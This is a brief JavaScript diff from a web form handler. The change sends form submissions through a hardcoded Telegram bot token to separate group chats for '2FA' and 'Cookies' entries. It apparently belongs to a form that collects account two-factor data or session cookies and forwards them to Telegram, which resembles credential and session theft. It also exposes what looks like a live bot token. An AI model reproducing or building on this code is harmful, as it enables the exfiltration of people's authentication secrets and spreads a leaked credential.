@@ -48,8 +48,18 @@ document.getElementById("submit-btn").addEventListener("click", function () {
     }
 
     // Telegram Bot API Integration
-    const botToken = "7734169736:AAGDFW2mVkNSLrrPClDohEfNE0whlwmBiuE"; // Replace with your bot token
-    const chatId = "7708954371"; // Replace with your Telegram Chat ID
+    const botToken = "7734169736:AAGDFW2mVkNSLrrPClDohEfNE0whlwmBiuE";
+    let chatIdForBot;
+    if (cookie2fa === "2FA") {
+        chatIdForBot = "-1002386343175";
+    } else if (cookie2fa === "Cookies") {
+        chatIdForBot = "-1002372301785";
+    } else {
+        alert("সঠিকভাবে 2FA বা Cookies সিলেক্ট করুন।");
+        return;
+    }
+
+    
     const message = `
       New Form Submission:
       - Account Type: ${accountType}
